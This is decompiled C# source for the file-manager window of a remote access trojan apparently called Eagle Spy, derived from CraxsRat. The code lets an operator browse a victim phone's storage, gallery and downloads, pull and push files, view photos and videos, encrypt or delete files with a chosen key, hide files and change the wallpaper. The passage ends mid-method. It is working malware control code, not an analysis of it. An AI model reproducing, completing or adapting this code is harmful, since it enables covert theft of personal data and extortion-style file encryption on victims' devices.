using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy.My;
using Eagle_Spy.My.Resources;
using Eagle_Spy.sockets;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x0200005F RID: 95
	[DesignerGenerated]
	public partial class FileManager : Form
	{
		// Token: 0x060005EE RID: 1518 RVA: 0x0008C3B8 File Offset: 0x0008A5B8
		public FileManager()
		{
			base.Load += this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxcaxca;
			base.FormClosing += this.FileManager_FormClosing;
			this.Title = "null";
			this.ver = "n/a";
			this.Correntindex = -1;
			this.paths_indexs = new Collection();
			this.FSize = "Large text editing is not allowed {1}  -->{0}";
			this.Q = "20";
			this.ShowVideo = false;
			this.DownStreams = new Collection();
			this.FileDirectory = reso.res_Path + "\\Thumbs";
			this.Clipboard = new List<Array>();
			this.isfront = false;
			this.tempImage = new PictureBox();
			this.searchbefore = new List<DataGridViewRow>();
			this.InitializeComponent();
		}

		// Token: 0x060005F1 RID: 1521 RVA: 0x00002423 File Offset: 0x00000623
		private void SpyStyle()
		{
		}

		// Token: 0x060005F2 RID: 1522 RVA: 0x000903A8 File Offset: 0x0008E5A8
		public void CraxsRatkfvuiorkenfudpajrsnCraxsRatskigysereax()
		{
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", false) != 0)
			{
				if (Operators.CompareString(language, "CN", false) == 0)
				{
					this.cancelbtn.Text = "停止";
					this.cancelbtn.Text = "清除";
					this.Downpic.Text = "下载";
					this.sdbtn.Text = "SD卡";
					this.dcmbtn.Text = "画廊";
					this.picbtn.Text = "图片";
					this.ThumbsCont.Text = "以前见过的使用";
					this.DGV0.Columns[0].HeaderText = "类型";
					this.DGV0.Columns[1].HeaderText = "姓名";
					this.DGV0.Columns[2].HeaderText = "尺寸";
					this.DGV0.Columns[3].HeaderText = "修改日期";
					this.DGV0.Columns[4].HeaderText = "创建日期";
					this.ctxMenu.Items[0].Text = "打开";
					this.ctxMenu.Items[1].Text = "复制";
					this.ctxMenu.Items[2].Text = "切";
					this.ctxMenu.Items[3].Text = "粘贴";
					this.ctxMenu.Items[4].Text = "下载";
					this.ctxMenu.Items[5].Text = "上传";
					this.ctxMenu.Items[6].Text = "加密";
					this.ctxMenu.Items[7].Text = "解密";
					this.ctxMenu.Items[8].Text = "压缩";
					this.ctxMenu.Items[9].Text = "解压";
					this.ctxMenu.Items[10].Text = "删除";
					this.ctxMenu.Items[11].Text = "创建文件";
					this.ctxMenu.Items[12].Text = "改名";
					this.ctxMenu.Items[13].Text = "编辑";
					this.ctxMenu.Items[14].Text = "隐藏";
					this.ctxMenu.Items[15].Text = "取消隐藏";
					this.ctxMenu.Items[16].Text = "设置为墙纸";
					this.ctxMenu.Items[17].Text = "播放声音";
					this.ctxMenu.Items[18].Text = "下载";
					return;
				}
			}
			else
			{
				this.cancelbtn.Text = "إيقاف";
				this.cancelbtn.Text = "حذف";
				this.Downpic.Text = "التحميلات";
				this.sdbtn.Text = "زاكرة الهاتف";
				this.dcmbtn.Text = "المعرض";
				this.picbtn.Text = "الصور";
				this.ThumbsCont.Text = "عرض من المحمل مسبقا";
				this.DGV0.Columns[0].HeaderText = "النوع";
				this.DGV0.Columns[1].HeaderText = "الأسم";
				this.DGV0.Columns[2].HeaderText = "الحجم";
				this.DGV0.Columns[3].HeaderText = "تاريخ التعديل";
				this.DGV0.Columns[4].HeaderText = "تاريخ الأنشاء";
				this.ctxMenu.Items[0].Text = "فتح";
				this.ctxMenu.Items[1].Text = "نسخ";
				this.ctxMenu.Items[2].Text = "قص";
				this.ctxMenu.Items[3].Text = "لصق";
				this.ctxMenu.Items[4].Text = "تحميل";
				this.ctxMenu.Items[5].Text = "إرسال ملف";
				this.ctxMenu.Items[6].Text = "تشفير";
				this.ctxMenu.Items[7].Text = "فك التشفير";
				this.ctxMenu.Items[8].Text = "ضغط";
				this.ctxMenu.Items[9].Text = "فك الضغط";
				this.ctxMenu.Items[10].Text = "حذف";
				this.ctxMenu.Items[11].Text = "إنشاء ملف";
				this.ctxMenu.Items[12].Text = "إعادة تسمية";
				this.ctxMenu.Items[13].Text = "تعديل";
				this.ctxMenu.Items[14].Text = "إخفاء";
				this.ctxMenu.Items[15].Text = "إظهار";
				this.ctxMenu.Items[16].Text = "تعين كخلفية الهاتف";
				this.ctxMenu.Items[17].Text = "تشغيل مقطع صوتي";
				this.ctxMenu.Items[18].Text = "التحميلات";
			}
		}

		// Token: 0x060005F3 RID: 1523 RVA: 0x000909E4 File Offset: 0x0008EBE4
		private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxcaxca(object sender, EventArgs e)
		{
			base.SetStyle(ControlStyles.UserPaint | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			base.ActiveControl = this.DGV0;
			base.Tag = "File" + this.classClient.UUID;
			this.Timer1.Start();
			this.Q = Convert.ToString(MySettingsProperty.Settings.ImageQualty);
			base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\9.ico");
			this.usrscreen.Image = reso.GetScreen(this.classClient.Screen);
			this.CraxsRatkfvuiorkenfudpajrsnCraxsRatskigysereax();
			this.Timer2.Start();
			this.DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f;
			this.DGV0.DefaultCellStyle.Font = reso.f;
			this.Text = this.Title;
			try
			{
				DataGridViewRow row = this.classClient.Row;
			}
			catch (Exception)
			{
			}
			this.Label1.Text = " ";
			this.OpenToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.OpenToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\open.png");
			this.OpenToolStripMenuItem.Tag = new object[] { 0, "null", "null" };
			this.DownloadToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.DownloadToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\download.png");
			this.DownloadToolStripMenuItem.Tag = new object[] { 0, "null", "null" };
			this.UploadToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.UploadToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\upload.png");
			this.UploadToolStripMenuItem.Tag = new object[] { 0, "null", "null" };
			this.EncryptToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.EncryptToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\encrypt.png");
			this.EncryptToolStripMenuItem.Tag = new object[] { 0, "null", "null" };
			this.DecodeToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.DecodeToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\decode.png");
			this.DecodeToolStripMenuItem.Tag = new object[] { 0, "null", "null" };
			this.ZipToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.ZipToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\zip.png");
			this.ZipToolStripMenuItem.Tag = new object[] { 0, "null", "null" };
			this.UnZipToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.UnZipToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\unzip.png");
			this.UnZipToolStripMenuItem.Tag = new object[] { 0, "null", "null" };
			this.DeleteToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.DeleteToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\delete.png");
			this.DeleteToolStripMenuItem.Tag = new object[] { 0, "null", "null" };
			this.AddFilesToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.AddFilesToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\add.png");
			this.AddFilesToolStripMenuItem.Tag = new object[] { 0, "null", "null" };
			this.RenameToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.RenameToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\rename.png");
			this.RenameToolStripMenuItem.Tag = new object[] { 0, "null", "null" };
			this.EditToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.EditToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\edit.png");
			this.EditToolStripMenuItem.Tag = new object[] { 0, "null", "null" };
			this.HideToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.HideToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\hidden.png");
			this.HideToolStripMenuItem.Tag = new object[] { 0, "null", "null" };
			this.ShowToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.ShowToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\show.png");
			this.ShowToolStripMenuItem.Tag = new object[] { 0, "null", "null" };
			this.FolderDownloadsToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.FolderDownloadsToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\downloads.png");
			this.FolderDownloadsToolStripMenuItem.Tag = new object[] { 0, "null", "null" };
			this.CutToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.CutToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\cut.png");
			this.CutToolStripMenuItem.Tag = new object[] { 0, "null", "null" };
			this.CopyToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.CopyToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\copy.png");
			this.CopyToolStripMenuItem.Tag = new object[] { 0, "null", "null" };
			this.PasteToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.PasteToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\paste.png");
			this.PasteToolStripMenuItem.Tag = new object[] { 0, "null", "null" };
			this.SetWallpaperToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.SetWallpaperToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\wallpaper.png");
			this.SetWallpaperToolStripMenuItem.Tag = new object[] { 0, "null", "null" };
			this.PlaySoundToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.PlaySoundToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\playsound.png");
			this.PlaySoundToolStripMenuItem.Tag = new object[] { 0, "null", "null" };
			this.TOpacity.Interval = SpySettings.T_Interval;
			this.TOpacity.Enabled = true;
		}

		// Token: 0x060005F4 RID: 1524 RVA: 0x00003CFA File Offset: 0x00001EFA
		private void DGV0_SortCompare(object sender, DataGridViewSortCompareEventArgs e)
		{
			if (e.RowIndex1 == 0)
			{
				e.Handled = true;
			}
		}

		// Token: 0x060005F5 RID: 1525 RVA: 0x0009115C File Offset: 0x0008F35C
		private void DGV0_CellMouseDoubleClick(object sender, DataGridViewCellMouseEventArgs e)
		{
			try
			{
				string text = this.DGV0.CurrentRow.Index.ToString();
				string text2 = this.pathtxt.Text;
				if (!this.paths_indexs.Contains(text2))
				{
					this.paths_indexs.Add(new object[] { text }, text2, null, null);
					this.Correntindex = this.DGV0.CurrentRow.Index;
				}
				else
				{
					object[] array = (object[])this.paths_indexs[text2];
					string text3 = Conversions.ToString(array[0]);
					if (Operators.CompareString(text3, this.DGV0.CurrentRow.Index.ToString(), false) != 0)
					{
						this.Correntindex = this.DGV0.CurrentRow.Index;
					}
				}
			}
			catch (Exception)
			{
			}
			if (e.RowIndex > 0 && e.ColumnIndex >= 0)
			{
				if (Operators.ConditionalCompareObjectEqual(this.DGV0.Rows[e.RowIndex].Cells[0].Tag, "0", false))
				{
					if (this.classClient != null)
					{
						object[] array2 = new object[]
						{
							this.Client,
							Operators.ConcatenateObject(string.Concat(new string[]
							{
								SecurityKey.KeysClient1,
								Data.SPL_SOCKET,
								reso.domen,
								".files",
								Data.SPL_SOCKET,
								"method",
								Data.SPL_SOCKET,
								SecurityKey.getfiles,
								Data.SPL_SOCKET,
								"files",
								Data.SPL_DATA
							}), this.Pnext(Conversions.ToString(this.DGV0.Tag), Conversions.ToString(this.DGV0.Rows[e.RowIndex].Cells[1].Value))),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(array2);
					}
					return;
				}
				string text4 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[e.RowIndex].Cells[1].Value));
				string text5 = Conversions.ToString(this.DGV0.Rows[e.RowIndex].Cells[0].Tag);
				string text6 = Conversions.ToString(this.DGV0.Rows[e.RowIndex].Cells[1].Value);
				if (Operators.CompareString(text5, "1", false) != 0)
				{
					return;
				}
				if (this.ISupportedText(text6.ToLower()))
				{
					object objectValue = RuntimeHelpers.GetObjectValue(this.DGV0.Rows[e.RowIndex].Cells[2].Tag);
					if (!Operators.ConditionalCompareObjectLessEqual(objectValue, 512000, false))
					{
						Interaction.MsgBox(string.Format(this.FSize, RuntimeHelpers.GetObjectValue(this.DGV0.Rows[e.RowIndex].Cells[2].Value), RuntimeHelpers.GetObjectValue(this.DGV0.Rows[e.RowIndex].Cells[1].Value)), MsgBoxStyle.Critical, reso.nameRAT);
						return;
					}
					if (this.classClient != null)
					{
						object[] array3 = new object[]
						{
							this.Client,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient1,
								Data.SPL_SOCKET,
								reso.domen,
								".files",
								Data.SPL_SOCKET,
								"method",
								Data.SPL_SOCKET,
								SecurityKey.editor,
								Data.SPL_SOCKET,
								"edit",
								Data.SPL_DATA,
								text4
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(array3);
					}
					return;
				}
				else
				{
					object obj = (this.ISupportedImages(text6.ToLower()) ? "false" : ((!this.ISupportedVideo(text6.ToLower())) ? "null" : "true"));
					if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, "null", false))) && this.classClient != null)
					{
						string[] array4 = this.classClient.Keys.Split(new char[] { ':' });
						object[] array5 = new object[]
						{
							this.Client,
							Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
							{
								SecurityKey.KeysClient1,
								Data.SPL_SOCKET,
								reso.domen,
								".files",
								Data.SPL_SOCKET,
								"method",
								Data.SPL_SOCKET,
								SecurityKey.resultClient,
								Data.SPL_SOCKET,
								"small",
								Data.SPL_DATA,
								array4[0],
								Data.SPL_DATA,
								array4[1],
								Data.SPL_DATA,
								text4,
								Data.SPL_DATA
							}), obj), Data.SPL_DATA), this.Q), Data.SPL_DATA), SecurityKey.ImageViewer), "File" + this.classClient.UUID),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(array5);
						return;
					}
				}
			}
			else if (e.RowIndex == 0 && e.ColumnIndex >= 0 && this.classClient != null)
			{
				object[] array6 = new object[]
				{
					this.Client,
					Operators.ConcatenateObject(string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".files",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.getfiles,
						Data.SPL_SOCKET,
						"files",
						Data.SPL_DATA
					}), this.Pback(Conversions.ToString(this.DGV0.Tag))),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array6);
			}
		}

		// Token: 0x060005F6 RID: 1526 RVA: 0x0009181C File Offset: 0x0008FA1C
		private object Pback(string p)
		{
			string text = string.Format("{0}", p.Substring(0, p.LastIndexOf("/")));
			if (!text.Contains("/"))
			{
				return "/";
			}
			return text;
		}

		// Token: 0x060005F7 RID: 1527 RVA: 0x00003D0B File Offset: 0x00001F0B
		private object Pnext(string p, string n)
		{
			return p + "/" + n;
		}

		// Token: 0x060005F8 RID: 1528 RVA: 0x0009185C File Offset: 0x0008FA5C
		private void DownloadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.DGV0.SelectedRows.Count <= 0)
			{
				return;
			}
			checked
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
					if (Operators.CompareString(text, "1", false) == 0)
					{
						string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
						if (this.classClient != null)
						{
							string[] array = this.classClient.Keys.Split(new char[] { ':' });
							object[] array2 = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"download",
									Data.SPL_DATA,
									array[0],
									Data.SPL_DATA,
									array[1],
									Data.SPL_DATA,
									text2,
									Data.SPL_DATA,
									SecurityKey.down_info,
									Data.SPL_DATA,
									SecurityKey.downByte,
									"File",
									this.classClient.UUID,
									Data.SPL_DATA,
									"File",
									this.classClient.UUID
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array2);
						}
					}
				}
			}
		}

		// Token: 0x060005F9 RID: 1529 RVA: 0x00091A94 File Offset: 0x0008FC94
		private void UploadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.classClient == null)
			{
				return;
			}
			this.FilesUpload.Title = "Please select Files";
			this.FilesUpload.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			this.FilesUpload.Filter = "all Files|*.*";
			this.FilesUpload.FileName = string.Empty;
			this.FilesUpload.Multiselect = true;
			if (this.FilesUpload.ShowDialog() != DialogResult.OK || this.classClient == null)
			{
				return;
			}
			string[] fileNames = this.FilesUpload.FileNames;
			if (fileNames.Length == 0)
			{
				return;
			}
			string[] array = fileNames;
			string[] array2 = array;
			foreach (string text in array2)
			{
				string[] array4 = this.classClient.Keys.Split(new char[] { ':' });
				try
				{
					FileInfo fileInfo = new FileInfo(text);
					string text2 = Conversions.ToString(fileInfo.Length);
					string text3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), fileInfo.Name));
					string name = fileInfo.Name;
					string fullName = fileInfo.FullName;
					object[] array5 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient1,
							Data.SPL_SOCKET,
							reso.domen,
							".files",
							Data.SPL_SOCKET,
							"method",
							Data.SPL_SOCKET,
							SecurityKey.resultClient,
							Data.SPL_SOCKET,
							"upload",
							Data.SPL_DATA,
							array4[0],
							Data.SPL_DATA,
							array4[1],
							Data.SPL_DATA,
							text3,
							Data.SPL_DATA,
							text2,
							Data.SPL_DATA,
							name,
							Data.SPL_DATA,
							fullName,
							Data.SPL_DATA,
							SecurityKey.upload_info,
							Data.SPL_DATA,
							SecurityKey.uploadByte
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array5);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060005FA RID: 1530 RVA: 0x00091CF0 File Offset: 0x0008FEF0
		private void ViewToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.DGV0.SelectedRows.Count <= 0)
			{
				return;
			}
			checked
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
					if (Operators.CompareString(text, "1", false) == 0)
					{
						string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
						string text3 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
						object obj = (this.ISupportedImages(text3.ToLower()) ? "false" : ((!this.ISupportedVideo(text3.ToLower())) ? "null" : "true"));
						if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, "null", false))) && this.classClient != null)
						{
							string[] array = this.classClient.Keys.Split(new char[] { ':' });
							object[] array2 = new object[]
							{
								this.Client,
								Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"small",
									Data.SPL_DATA,
									array[0],
									Data.SPL_DATA,
									array[1],
									Data.SPL_DATA,
									text2,
									Data.SPL_DATA
								}), obj), Data.SPL_DATA), this.Q), Data.SPL_DATA), SecurityKey.ImageViewer), "File" + this.classClient.UUID),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array2);
						}
					}
				}
			}
		}

		// Token: 0x060005FB RID: 1531 RVA: 0x00091FB0 File Offset: 0x000901B0
		private void ExternalStorageDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				object[] array = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".files",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.getfiles,
						Data.SPL_SOCKET,
						"files",
						Data.SPL_DATA,
						"get0"
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x060005FC RID: 1532 RVA: 0x00092074 File Offset: 0x00090274
		private void DirectoryDownloadsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				object[] array = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".files",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.getfiles,
						Data.SPL_SOCKET,
						"files",
						Data.SPL_DATA,
						"get1"
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x060005FD RID: 1533 RVA: 0x00092138 File Offset: 0x00090338
		private void DirectoryPicturesToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				object[] array = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".files",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.getfiles,
						Data.SPL_SOCKET,
						"files",
						Data.SPL_DATA,
						"get2"
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x060005FE RID: 1534 RVA: 0x000921FC File Offset: 0x000903FC
		private void DirectoryDCIMToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				object[] array = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".files",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.getfiles,
						Data.SPL_SOCKET,
						"files",
						Data.SPL_DATA,
						"get3"
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x060005FF RID: 1535 RVA: 0x000922C0 File Offset: 0x000904C0
		private void CustomToolStripMenuItem_Click(object sender, EventArgs e)
		{
			inp inp = new inp();
			inp.Text = "Access Path";
			inp.LTitle.Text = "Add path";
			inp.InputText.Text = ((this.DGV0.Tag.ToString().Length == 0) ? "/" : this.DGV0.Tag.ToString());
			inp.StartPosition = FormStartPosition.Manual;
			inp.Location = Codes.FixSize(this, inp);
			DialogResult dialogResult = inp.ShowDialog(this);
			if (dialogResult == DialogResult.OK && this.classClient != null)
			{
				object[] array = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".files",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.getfiles,
						Data.SPL_SOCKET,
						"files",
						Data.SPL_DATA,
						inp.InputText.Text
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
			inp.Close();
		}

		// Token: 0x06000600 RID: 1536 RVA: 0x0009240C File Offset: 0x0009060C
		private void FolderDownloadsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				string text = this.classClient.FolderUSER + "\\Downloads";
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				Process.Start(text);
			}
		}

		// Token: 0x06000601 RID: 1537 RVA: 0x00092450 File Offset: 0x00090650
		private void DecodeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.classClient == null)
			{
				return;
			}
			inp inp = new inp();
			inp.Text = "decryption";
			inp.LTitle.Text = "Add decryption key";
			inp.InputText.Text = MySettingsProperty.Settings.EncryptionKey;
			inp.StartPosition = FormStartPosition.Manual;
			inp.Location = Codes.FixSize(this, inp);
			DialogResult dialogResult = inp.ShowDialog(this);
			checked
			{
				if (dialogResult == DialogResult.OK && this.classClient != null && this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
						if (Operators.CompareString(text, "1", false) == 0)
						{
							string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
							string text3 = ".crypt";
							string text4;
							if (text2.EndsWith(text3))
							{
								int num2 = text2.LastIndexOf(text3);
								text4 = text2.Substring(0, num2);
							}
							else
							{
								text4 = text2 + ".decrypt";
							}
							object[] array = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"decrypt",
									Data.SPL_DATA,
									text2,
									Data.SPL_DATA,
									text4,
									Data.SPL_DATA,
									inp.InputText.Text
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array);
						}
					}
				}
				inp.Close();
			}
		}

		// Token: 0x06000602 RID: 1538 RVA: 0x000926BC File Offset: 0x000908BC
		private void EncryptToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.classClient == null)
			{
				return;
			}
			inp inp = new inp();
			inp.Text = "encryption";
			inp.LTitle.Text = "Add encryption key";
			inp.InputText.Text = MySettingsProperty.Settings.EncryptionKey;
			inp.StartPosition = FormStartPosition.Manual;
			inp.Location = Codes.FixSize(this, inp);
			DialogResult dialogResult = inp.ShowDialog(this);
			checked
			{
				if (dialogResult == DialogResult.OK && this.classClient != null && this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
						if (Operators.CompareString(text, "1", false) == 0)
						{
							string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
							object[] array = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"encrypt",
									Data.SPL_DATA,
									text2,
									Data.SPL_DATA,
									".crypt",
									Data.SPL_DATA,
									inp.InputText.Text
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array);
							MySettingsProperty.Settings.EncryptionKey = inp.InputText.Text;
							MySettingsProperty.Settings.Save();
						}
					}
				}
				inp.Close();
			}
		}

		// Token: 0x06000603 RID: 1539 RVA: 0x00092910 File Offset: 0x00090B10
		private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.DGV0.SelectedRows.Count <= 0)
			{
				return;
			}
			checked
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
					string text2 = "del0";
